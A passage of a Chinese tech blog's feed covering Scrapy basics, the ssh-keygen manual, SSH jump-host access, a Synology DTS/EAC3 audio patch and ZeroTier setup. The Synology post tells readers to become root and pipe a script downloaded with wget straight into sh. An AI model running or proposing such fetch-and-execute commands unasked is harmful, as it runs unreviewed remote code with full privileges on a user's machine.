<li><p>引擎从下载器中接收到Response并通过Spider中间件(输入方向)发送给Spider处理。</p>
</li>
<li><p>Spider处理Response并返回爬取到的Item及(跟进的)新的Request给引擎。</p>
</li>
<li><p>引擎将(Spider返回的)爬取到的Item给Item Pipeline，将(Spider返回的)Request给调度器。</p>
</li>
<li><p>(从第二步)重复直到调度器中没有更多地request，引擎关闭该网站。 </p>
</li>
</ol>
</blockquote>
<h1 id="建立Scrapy爬虫项目流程"><a href="#建立Scrapy爬虫项目流程" class="headerlink" title="建立Scrapy爬虫项目流程"></a>建立Scrapy爬虫项目流程</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><p>在开始爬取之前，首先要创建一个新的Scrapy项目。这里以爬取我的博客为例，进入你打算存储代码的目录中，运行下列命令:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy startproject scrapyspider</span><br></pre></td></tr></table></figure>
<p>该命令将会创建包含下列内容的<code>scrapyspider</code>目录:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scrapyspider/</span><br><span class="line">    scrapy.cfg</span><br><span class="line">    scrapyspider/</span><br><span class="line">        __init__.py</span><br><span class="line">        items.py</span><br><span class="line">        pipelines.py</span><br><span class="line">        settings.py</span><br><span class="line">        spiders/</span><br><span class="line">            __init__.py</span><br><span class="line">            ...</span><br></pre></td></tr></table></figure>

<p>这些文件分别是:</p>
<ul>
<li>scrapy.cfg: 项目的配置文件。</li>
<li>tutorial/: 该项目的python模块。之后您将在此加入代码。</li>
<li>tutorial/items.py: 项目中的item文件。</li>
<li>tutorial/pipelines.py: 项目中的pipelines文件。</li>
<li>tutorial/settings.py: 项目的设置文件。</li>
<li>tutorial/spiders/: 放置spider代码的目录。</li>
</ul>
<h2 id="编写第一个爬虫-Spider"><a href="#编写第一个爬虫-Spider" class="headerlink" title="编写第一个爬虫(Spider)"></a>编写第一个爬虫(Spider)</h2><blockquote>
<p>Spider是用户编写用于从单个网站(或者一些网站)爬取数据的类。</p>
<p>其包含了一个用于下载的初始URL，如何跟进网页中的链接以及如何分析页面中的内容， 提取生成 item 的方法。</p>
<p>为了创建一个Spider，您必须继承 scrapy.Spider 类， 且定义以下三个属性:</p>
<ul>
<li>name: 用于区别Spider。 该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。  </li>
<li>start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。</li>
<li>parse() 是spider的一个方法。 被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。</li>
</ul>
</blockquote>
<p>以下为我们的第一个Spider代码，保存在<code>scrapyspider/spiders</code>目录下的<code>blog_spider.py</code>文件中:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BlogSpider</span>(<span class="title class_ inherited__">Spider</span>):</span><br><span class="line">    name = <span class="string">&#x27;woodenrobot&#x27;</span></span><br><span class="line">    start_urls = [<span class="string">&#x27;https://woodenrobot.me&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse</span>(<span class="params">self, response</span>):</span><br><span class="line">        titles = response.xpath(<span class="string">&#x27;//a[@class=&quot;post-title-link&quot;]/text()&#x27;</span>).extract()</span><br><span class="line">        <span class="keyword">for</span> title <span class="keyword">in</span> titles:</span><br><span class="line">            <span class="built_in">print</span> title.strip()</span><br></pre></td></tr></table></figure>
<h2 id="启动爬虫"><a href="#启动爬虫" class="headerlink" title="启动爬虫"></a>启动爬虫</h2><p>在项目文件夹内打开<code>cmd</code>运行下列命令：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy crawl woodenrobot</span><br></pre></td></tr></table></figure>
<p>启动爬虫后就可以看到打印出来当前页所有文章标题了。</p>
<p><strong>Ps:这一篇教程里就先简单介绍这么多，有好多东西我还没想好这么讲。期待后面的干货吧！</strong></p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ol>
<li><a href="http://scrapy-chs.readthedocs.io/zh_CN/latest/">Scrapy官方中文文档</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>Scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title>[转] ssh-keygen 详解</title>
    <url>/2017/06/30/ssh-keygen%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p>文章来源于：<a href="http://linux.chinaunix.net/techdoc/beginner/2010/01/12/1153509.shtml">ssh-keygen 中文手册</a></p>
<h1 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h1><p>ssh-keygen - 生成、管理和转换认证密钥</p>
<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ssh-keygen [-q] [-b bits] -t <span class="built_in">type</span> [-N new_passphrase] [-C comment] [-f output_keyfile]</span><br><span class="line">ssh-keygen -p [-P old_passphrase] [-N new_passphrase] [-f keyfile]</span><br><span class="line">ssh-keygen -i [-f input_keyfile]</span><br><span class="line">ssh-keygen -e [-f input_keyfile]</span><br><span class="line">ssh-keygen -y [-f input_keyfile]</span><br><span class="line">ssh-keygen -c [-P passphrase] [-C comment] [-f keyfile]</span><br><span class="line">ssh-keygen -l [-f input_keyfile]</span><br><span class="line">ssh-keygen -B [-f input_keyfile]</span><br><span class="line">ssh-keygen -D reader</span><br><span class="line">ssh-keygen -F hostname [-f known_hosts_file]</span><br><span class="line">ssh-keygen -H [-f known_hosts_file]</span><br><span class="line">ssh-keygen -R hostname [-f known_hosts_file]</span><br><span class="line">ssh-keygen -U reader [-f input_keyfile]</span><br><span class="line">ssh-keygen -r hostname [-f input_keyfile] [-g]</span><br><span class="line">ssh-keygen -G output_file [-v] [-b bits] [-M memory] [-S start_point]</span><br><span class="line">ssh-keygen -T output_file -f input_file [-v] [-a num_trials] [-W generator]</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><p>ssh-keygen 用于为<a href="http://man.openbsd.org/ssh">ssh(1)</a>生成、管理和转换认证密钥，包括 RSA 和 DSA 两种密钥。<br>密钥类型可以用 -t 选项指定。如果没有指定则默认生成用于SSH-2的RSA密钥。<br>ssh-keygen 还可以用来产生 Diffie-Hellman group exchange (DH-GEX) 中使用的素数模数。<br>参见模数和生成小节。<br>一般说来，如果用户希望使用RSA或DSA认证，那么至少应该运行一次这个程序，在 ~/.ssh/identity, ~/.ssh/id_dsa 或 ~/.ssh/id_rsa 文件中创建认证所需的密钥。<br>另外，系统管理员还可以用它产生主机密钥。<br>通常，这个程序产生一个密钥对，并要求指定一个文件存放私钥，同时将公钥存放在附加了”.pub”后缀的同名文件中。<br>程序同时要求输入一个密语字符串(passphrase)，空表示没有密语(主机密钥的密语必须为空)。<br>密语和口令(password)非常相似，但是密语可以是一句话，里面有单词、标点符号、数字、空格或任何你想要的字符。<br>好的密语要30个以上的字符，难以猜出，由大小写字母、数字、非字母混合组成。密语可以用 -p 选项修改。<br>丢失的密语不可恢复。如果丢失或忘记了密语，用户必须产生新的密钥，然后把相应的公钥分发到其他机器上去。<br>RSA1的密钥文件中有一个”注释”字段，可以方便用户标识这个密钥，指出密钥的用途或其他有用的信息。<br>创建密钥的时候，注释域初始化为”user@host”，以后可以用 -c 选项修改。<br>密钥产生后，下面的命令描述了怎样处置和激活密钥。可用的选项有：  </p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">-a trials</span><br><span class="line">     在使用 -T 对 DH-GEX 候选素数进行安全筛选时需要执行的基本测试数量。</span><br><span class="line">-B      显示指定的公钥/私钥文件的 bubblebabble 摘要。</span><br><span class="line">-b bits</span><br><span class="line">     指定密钥长度。对于RSA密钥，最小要求<span class="number">768</span>位，默认是<span class="number">2048</span>位。DSA密钥必须恰好是<span class="number">1024</span>位(FIPS <span class="number">186</span>-<span class="number">2</span> 标准的要求)。</span><br><span class="line">-C comment</span><br><span class="line">     提供一个新注释</span><br><span class="line">-c      要求修改私钥和公钥文件中的注释。本选项只支持 RSA1 密钥。</span><br><span class="line">         程序将提示输入私钥文件名、密语(如果存在)、新注释。</span><br><span class="line">-D reader</span><br><span class="line">     下载存储在智能卡 reader 里的 RSA 公钥。</span><br><span class="line">-e      读取OpenSSH的私钥或公钥文件，并以 RFC <span class="number">4716</span> SSH 公钥文件格式在 stdout 上显示出来。</span><br><span class="line">     该选项能够为多种商业版本的 SSH 输出密钥。</span><br><span class="line">-F hostname</span><br><span class="line">     在 known_hosts 文件中搜索指定的 hostname ，并列出所有的匹配项。</span><br><span class="line">     这个选项主要用于查找散列过的主机名/ip地址，还可以和 -H 选项联用打印找到的公钥的散列值。</span><br><span class="line">-f filename</span><br><span class="line">     指定密钥文件名。</span><br><span class="line">-G output_file</span><br><span class="line">     为 DH-GEX 产生候选素数。这些素数必须在使用之前使用 -T 选项进行安全筛选。</span><br><span class="line">-g      在使用 -r 打印指纹资源记录的时候使用通用的 DNS 格式。</span><br><span class="line">-H      对 known_hosts 文件进行散列计算。这将把文件中的所有主机名/ip地址替换为相应的散列值。</span><br><span class="line">     原来文件的内容将会添加一个&quot;.old&quot;后缀后保存。这些散列值只能被 ssh 和 sshd 使用。</span><br><span class="line">     这个选项不会修改已经经过散列的主机名/ip地址，因此可以在部分公钥已经散列过的文件上安全使用。</span><br><span class="line">-i      读取未加密的SSH-<span class="number">2</span>兼容的私钥/公钥文件，然后在 stdout 显示OpenSSH兼容的私钥/公钥。</span><br><span class="line">     该选项主要用于从多种商业版本的SSH中导入密钥。</span><br><span class="line">-l      显示公钥文件的指纹数据。它也支持 RSA1 的私钥。</span><br><span class="line">     对于RSA和DSA密钥，将会寻找对应的公钥文件，然后显示其指纹数据。</span><br><span class="line">-M memory</span><br><span class="line">     指定在生成 DH-GEXS 候选素数的时候最大内存用量(MB)。</span><br><span class="line">-N new_passphrase</span><br><span class="line">     提供一个新的密语。</span><br><span class="line">-P passphrase</span><br><span class="line">     提供(旧)密语。</span><br><span class="line">-p      要求改变某私钥文件的密语而不重建私钥。程序将提示输入私钥文件名、原来的密语、以及两次输入新密语。</span><br><span class="line">-q      安静模式。用于在 /etc/rc 中创建新密钥的时候。</span><br><span class="line">-R hostname</span><br><span class="line">     从 known_hosts 文件中删除所有属于 hostname 的密钥。</span><br><span class="line">     这个选项主要用于删除经过散列的主机(参见 -H 选项)的密钥。</span><br><span class="line">-r hostname</span><br><span class="line">     打印名为 hostname 的公钥文件的 SSHFP 指纹资源记录。</span><br><span class="line">-S <span class="built_in">start</span></span><br><span class="line">     指定在生成 DH-GEX 候选模数时的起始点(<span class="number">16</span>进制)。</span><br><span class="line">-T output_file</span><br><span class="line">     测试 Diffie-Hellman group exchange 候选素数(由 -G 选项生成)的安全性。</span><br><span class="line">-t <span class="built_in">type</span></span><br><span class="line">     指定要创建的密钥类型。可以使用：&quot;rsa1&quot;(SSH-<span class="number">1</span>) &quot;rsa&quot;(SSH-<span class="number">2</span>) &quot;dsa&quot;(SSH-<span class="number">2</span>)</span><br><span class="line">-U reader</span><br><span class="line">     把现存的RSA私钥上传到智能卡 reader</span><br><span class="line">-v      详细模式。ssh-keygen 将会输出处理过程的详细调试信息。常用于调试模数的产生过程。</span><br><span class="line">     重复使用多个 -v 选项将会增加信息的详细程度(最大<span class="number">3</span>次)。</span><br><span class="line">-W generator</span><br><span class="line">     指定在为 DH-GEX 测试候选模数时想要使用的 generator</span><br><span class="line">-y      读取OpenSSH专有格式的公钥文件，并将OpenSSH公钥显示在 stdout 上。</span><br></pre></td></tr></table></figure>
<h1 id="模数生成"><a href="#模数生成" class="headerlink" title="模数生成"></a>模数生成</h1><p>ssh-keygen 可以生成用于 Diffie-Hellman Group Exchange (DH-GEX) 协议的 groups。<br>生成过程分为两步：<br>首先，使用一个快速且消耗内存较多的方法生成一些候选素数。然后，对这些素数进行适应性测试(消耗CPU较多)。<br>可以使用 -G 选项生成候选素数，同时使用 -b 选项制定其位数。例如：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh-keygen -G moduli-2048.candidates -b 2048</span><br></pre></td></tr></table></figure>
<p>默认将从指定位数范围内的一个随机点开始搜索素数，不过可以使用 -S 选项来指定这个随机点(16进制)。<br>生成一组候选数之后，接下来就需要使用 -T 选项进行适应性测试。<br>此时 ssh-keygen 将会从 stdin 读取候选素数(或者通过 -f 选项读取一个文件)，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ssh-keygen -T moduli-2048 -f moduli-2048.candidates</span><br></pre></td></tr></table></figure>
<p>每个候选素数默认都要通过 100 个基本测试(可以通过 -a 选项修改)。<br>DH generator 的值会自动选择，但是你也可以通过 -W 选项强制指定。有效的值可以是： 2, 3, 5<br>经过筛选之后的 DH groups 就可以存放到 /etc/ssh/moduli 里面了。<br>很重要的一点是这个文件必须包括不同长度范围的模数，而且通信双方双方共享相同的模数。  </p>
<h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/identity</span><br></pre></td></tr></table></figure>
<p>该用户默认的 RSA1 身份认证私钥(SSH-1)。此文件的权限应当至少限制为”600”。<br>生成密钥的时候可以指定采用密语来加密该私钥(3DES)。  </p>
<p><a href="http://man.openbsd.org/ssh">ssh(1)</a>将在登录的时候读取这个文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/identity.pub</span><br></pre></td></tr></table></figure>
<p>该用户默认的 RSA1 身份认证公钥(SSH-1)。此文件无需保密。<br>此文件的内容应该添加到所有 RSA1 目标主机的 ~/.ssh/authorized_keys 文件中。  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/id_dsa</span><br></pre></td></tr></table></figure>
<p>该用户默认的 DSA 身份认证私钥(SSH-2)。此文件的权限应当至少限制为”600”。<br>生成密钥的时候可以指定采用密语来加密该私钥(3DES)。  </p>
<p><a href="http://man.openbsd.org/ssh">ssh(1)</a>将在登录的时候读取这个文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/id_dsa.pub</span><br></pre></td></tr></table></figure>
<p>该用户默认的 DSA 身份认证公钥(SSH-2)。此文件无需保密。<br>此文件的内容应该添加到所有 DSA 目标主机的 ~/.ssh/authorized_keys 文件中。  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
<p>该用户默认的 RSA 身份认证私钥(SSH-2)。此文件的权限应当至少限制为”600”。<br>生成密钥的时候可以指定采用密语来加密该私钥(3DES)。  </p>
<p><a href="http://man.openbsd.org/ssh">ssh(1)</a>将在登录的时候读取这个文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>该用户默认的 RSA 身份认证公钥(SSH-2)。此文件无需保密。<br>此文件的内容应该添加到所有 RSA 目标主机的 ~/.ssh/authorized_keys 文件中。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/ssh/moduli</span><br></pre></td></tr></table></figure>
<p>包含用于 DH-GEX 的 Diffie-Hellman groups。  </p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>SSH 通过跳板机直接访问内网机器</title>
    <url>/2019/07/18/ssh-proxyjump/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>公司的很多服务器没有外网地址只能通过内网访问。</p>
<p>这个时候就需要我们先登录跳板机，然后在跳板机上登录内网机器（本机 ssh -&gt; 跳板机 -&gt; 内网机器）。</p>
<p>因为跳板机是公用的，所以为了安全不能将跳板机的公钥放到内网机器上实现免密登录，更不能将本机的公钥和私钥放到跳板机上实现免密登录。因为懒所以就搜寻到一个解决方案。</p>
<p>Ps:懒人改变世界: )</p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="ProxyJump"><a href="#ProxyJump" class="headerlink" title="ProxyJump"></a>ProxyJump</h2><p>需要 <code>OpenSSH 7.3</code> 以上版本才可以使用 <code>ProxyJump</code>, 使用下列命令查看<code>OpenSSH</code> 版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -V</span><br></pre></td></tr></table></figure>
<p><code>ProxyJump</code> 命令行使用方法：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -J [email protected]:port1,[email protected]:port2 </span><br></pre></td></tr></table></figure>
<p>可以直接使用上述命令通过跳板机直接登录内网机器，比如：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh username@目标机器IP -p 22 -J username@跳板机IP:22</span><br></pre></td></tr></table></figure>
<p>如果需要通过多个跳板机则以 <code>,</code> 分割：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@目标机器IP -p 22 -J username1@跳板机IP1:22,username2@跳板机IP2:22</span><br></pre></td></tr></table></figure>

<p>如果你觉得每次都需要加上 <code>-J</code> 的配置很多麻烦，可以写到配置文件里。修改配置文件 <code>~\.ssh\config</code>，默认没有需要自己创建。增加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host target    # 代表目标机器的名字</span><br><span class="line">    HostName 目标机器 IP    # 这个是目标机器的 IP</span><br><span class="line">    Port 22    # 目标机器 ssh 的端口</span><br><span class="line">    User username_target    # 目标机器的用户名</span><br><span class="line">    ProxyJump username@跳板机IP:port</span><br><span class="line"></span><br><span class="line">Host 10.10.0.*    # 使用通配符 * 代表 10.10.0.1 - 10.10.0.255</span><br><span class="line">    Port 22    # 服务器端口</span><br><span class="line">    User username    # 服务器用户名</span><br><span class="line">    ProxyJump username@跳板机IP:port</span><br></pre></td></tr></table></figure>
<p>也可以为跳板机器一个“别名”方便使用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host tiaoban1    # 代表跳板机 1</span><br><span class="line">    HostName 跳板机 1 的 IP</span><br><span class="line">    Port 22    # ssh 连接端口</span><br><span class="line">    User username1    # 跳板机 1 的用户名</span><br><span class="line"></span><br><span class="line">Host tiaoban2    # 代表跳板机 2</span><br><span class="line">    HostName 跳板机 2 的 IP</span><br><span class="line">    Port 22    # ssh 连接端口</span><br><span class="line">    User username2    # 跳板机 2 的用户名</span><br><span class="line"></span><br><span class="line">Host target    # 代表目标机器的名字</span><br><span class="line">    HostName 目标机器 IP    # 这个是目标机器的 IP</span><br><span class="line">    Port 22    # 目标机器 ssh 的端口</span><br><span class="line">    User username_target    # 目标机器的用户名</span><br><span class="line">    ProxyJump tiaoban1,tiaoban2</span><br><span class="line"></span><br><span class="line">Host 10.10.0.*    # 使用通配符 * 代表 10.10.0.1 - 10.10.0.255</span><br><span class="line">    Port 22    # 服务器端口</span><br><span class="line">    User username    # 服务器用户名</span><br><span class="line">    ProxyJump tiaoban1,tiaoban2</span><br></pre></td></tr></table></figure>
<p>使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh target</span><br><span class="line">ssh 10.10.0.1</span><br><span class="line">ssh username@target -p22</span><br><span class="line">ssh username@10.10.0.1 -p22</span><br></pre></td></tr></table></figure>

<h2 id="ProxyCommand"><a href="#ProxyCommand" class="headerlink" title="ProxyCommand"></a>ProxyCommand</h2><p>如果 <code>OpenSSH</code> 版本低于 <strong>7.3</strong> 可以使用 <code>ProxyCommand</code> 达到同样的效果。</p>
<p><code>ProxyCommand</code> 命令行使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@目标机器IP -p 22 -o ProxyCommand=&#x27;ssh -p 22 username@跳板机IP -W %h:%p&#x27;</span><br></pre></td></tr></table></figure>
<p>同样可以在 <code>~/.ssh/config</code> 文件中增加配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host tiaoban   # 任意名字，随便使用</span><br><span class="line"></span><br><span class="line">    HostName 跳板机的 IP，支持域名</span><br><span class="line"></span><br><span class="line">    Port 22      # 跳板机端口</span><br><span class="line"></span><br><span class="line">    User username_tiaoban       # 跳板机用户</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Host target      # 同样，任意名字，随便起</span><br><span class="line"></span><br><span class="line">    HostName 目标服务器 IP    # 真正登陆的服务器，不支持域名必须IP地址</span><br><span class="line"></span><br><span class="line">    Port 22   # 服务器的端口</span><br><span class="line"></span><br><span class="line">    User username   # 服务器的用户</span><br><span class="line"></span><br><span class="line">    ProxyCommand ssh tiaoban -W %h:%p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Host 10.10.0.*      # 可以用*通配符</span><br><span class="line"></span><br><span class="line">    Port 22   # 服务器的端口</span><br><span class="line"></span><br><span class="line">    User username   # 服务器的用户</span><br><span class="line"></span><br><span class="line">    ProxyCommand ssh tiaoban -W %h:%p</span><br></pre></td></tr></table></figure>
<p>使用方法同上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh target</span><br><span class="line">ssh 10.10.0.1</span><br><span class="line">ssh username@target -p22</span><br><span class="line">ssh username@10.10.0.1 -p22</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://my.oschina.net/foreverich/blog/657075">ssh如何通过跳板机直接访问到后端服务器(Mac&amp;Linux&amp;Windows解决方案)</a></li>
<li><a href="http://netsecurity.51cto.com/art/201711/557999.htm">SSH命令行帮你实现六种“贴心”的安全应用</a></li>
<li><a href="https://www.lzskyline.com/archives/478">[转]SSH隧道：内网穿透实战</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>群晖 Video Station 支持 DTS 和 eac3 解决方案</title>
    <url>/2019/08/12/syn-vediostation/</url>
    <content><![CDATA[<p><strong>新脚本已支持 DSM 6.2.4-25556  VideoStation 2.4.10 - 1632 不需要卸载Moments 和Advanced Media Extensions，请先用卸载命令卸载老的再重新安装一次就可以了，试过的同学请反馈一下！</strong></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>蜗牛星际装了黑群晖，下了几部蓝光电影，播放的时候确显示“不支持当前所选音频的文件格式，因此无法播放视频。请尝试其它音轨，确定其是否支持”。经过查询得知这两个音轨是需要授权使用的，群晖应该没有给授权费，所以在后续的 Video Station 版本中禁用了这些音轨。</p>
<span id="more"></span>

<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><h2 id="添加第三方套件中心"><a href="#添加第三方套件中心" class="headerlink" title="添加第三方套件中心"></a>添加第三方套件中心</h2><ol>
<li>（管理员账号）进入 DSM 桌面，打开<code>套件中心</code>，点击<code>设置</code> —&gt; <code>常规</code>，在<code>信任层级</code>中选择<code>任何发行者</code>;</li>
<li>接着点击 <code>套件来源</code>，选择 <code>新增</code> 添加第三方源 <a href="http://packages.synocommunity.com/">http://packages.synocommunity.com/</a> </li>
</ol>
<h2 id="安装-ffmpeg"><a href="#安装-ffmpeg" class="headerlink" title="安装 ffmpeg"></a>安装 ffmpeg</h2><p>在刚刚添加的第三方套件源中找到 <code>ffmpeg</code> 进行安装。</p>
<h3 id="方案一（不推荐）"><a href="#方案一（不推荐）" class="headerlink" title="方案一（不推荐）"></a>方案一（不推荐）</h3><h2 id="Video-Station-降级"><a href="#Video-Station-降级" class="headerlink" title="Video Station 降级"></a>Video Station 降级</h2><ol>
<li>首先在套件中心卸载最新版的 <code>Video Station</code>;</li>
<li>然后下载 <a href="https://global.download.synology.com/download/Package/spk/VideoStation/2.3.4-1468/VideoStation-x86_64-2.3.4-1468.spk"><code>video station 2.3.4-1468</code></a> 版本手动安装；</li>
<li>安装后保持当前版本不要升级。<br>安装后打开 <code>Video Station</code> 就可以播放 <code>DTS</code> 和 <code>eac3</code> 音轨的视频了。</li>
</ol>
<p><strong>PS：使用这个方案会失去最新版 video station 的特性，比如倍速播放、电视剧搜刮信息更全的遗憾</strong></p>
<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p><strong>适用于最新 <code>2.4.9-1626</code> 版 <code>Video Station</code></strong></p>
<p>首先 SSH 登录群晖并进入 root 用户下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure>
<p>执行下列一键安装脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(wget -O- https://raw.githubusercontent.com/Wooden-Robot/documents-for-fun/master/Synology/ffmpeg_dts_eac3_patch.sh)&quot; -p install</span><br></pre></td></tr></table></figure>

<p>安装后重新启动 <code>Video Station</code> 就可以播放 <code>DTS</code> 和 <code>eac3</code> 音轨的视频了。</p>
<p>卸载补丁执行下列命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -c &quot;$(wget -O- https://raw.githubusercontent.com/Wooden-Robot/documents-for-fun/master/Synology/ffmpeg_dts_eac3_patch.sh)&quot; -p uninstall</span><br></pre></td></tr></table></figure>

<p><strong>如果无法使用上面的 github 脚本！请关注公众号：<code>WoodenRobot</code> 回复 <code>dts</code>  获取国内安装和卸载命令！</strong></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a href="https://www.zhihu.com/question/271946974">群晖如何支持eac3？</a></li>
<li><a href="https://github.com/crazykuma/dsm_plugins/blob/master/ffmpeg_dts_eac3_patch.sh">ffmpeg_dts_eac3_patch.sh</a></li>
<li><a href="https://post.smzdm.com/p/a4w0l55w/">群晖Video Station不支持dts eac3的解决方案</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>群晖</tag>
      </tags>
  </entry>
  <entry>
    <title>群晖 Synology 安装 ZeroTier</title>
    <url>/2019/07/14/syn-zerotier/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近购买了一台蜗牛星际矿难机器，自己安装了黑群晖，记录一下群晖安装 ZeroTier 远程访问的过程。</p>
<span id="more"></span>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="下载安装包"><a href="#下载安装包" class="headerlink" title="下载安装包"></a>下载安装包</h2><p>在 ZeroTier 官网下载群晖专用安装包：<a href="https://download.zerotier.com/dist/synology/">https://download.zerotier.com/dist/synology/</a></p>
<p>请根据自己的电脑 CPU 选择相应的安装包，蜗牛星际 C 款是：<del><a href="https://download.zerotier.com/dist/synology/zerotier-1.2.12r1-syn-x64-6.1.spk">zerotier-1.2.12r1-syn-x64-6.1.spk</a></del></p>
<p><strong>请安装解决了重启不能自启 bug 的最新版</strong></p>
<h2 id="安装-ZeroTier"><a href="#安装-ZeroTier" class="headerlink" title="安装 ZeroTier"></a>安装 ZeroTier</h2><p>进入群晖的套件中心，选择手动安装进行安装。<br><img src="/images/syn-zerotier1.png"></p>
<h2 id="加入-ZeroTier-网络"><a href="#加入-ZeroTier-网络" class="headerlink" title="加入 ZeroTier 网络"></a>加入 ZeroTier 网络</h2><p>在套件中心打开安装好后的 ZeroTier，计入已经创建好的 ZeroTier 网络。ZeroTier 网络的创建请参考：<a href="https://woodenrobot.me/2019/07/07/zerotier-one-start/">P2P 内网穿透工具 ZeroTier</a><br><img src="/images/syn-zerotier2.png"></p>
<h2 id="修复开机自启-BUG"><a href="#修复开机自启-BUG" class="headerlink" title="修复开机自启 BUG"></a>修复开机自启 BUG</h2><p><del>重启后 ZeroTier 的虚拟网卡不能够加载成功，外届无法连通 群晖，只能群晖连接 ZeroTier 网络用户中的其他用户。</del></p>
<p><del>进入群晖的 Shell 环境运行下列命令：</del></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt;&lt;<span class="string">EOF &gt; /usr/local/etc/rc.d/tun.sh</span></span><br><span class="line"><span class="string">#!/bin/sh -e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">insmod /lib/modules/tun.ko</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>修改文件运行权限：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x /usr/local/etc/rc.d/tun.sh</span><br></pre></td></tr></table></figure>
<p>根据 <a href="https://github.com/zerotier/ZeroTierNAS/issues/28">https://github.com/zerotier/ZeroTierNAS/issues/28</a> 最新版（1.4.0）已经解决了重启不能启动的 BUG。</p>
<blockquote>
<p>Hey everyone, my apologies for taking so long on this. Here’s an updated set of packages to preview 1.4.0. It addresses the following issues:</p>
<ul>
<li>Losing interface on reboot: insmod /lib/modules/tun.ko issued upon each reboot (and start of the service). See tickets #41 and #43</li>
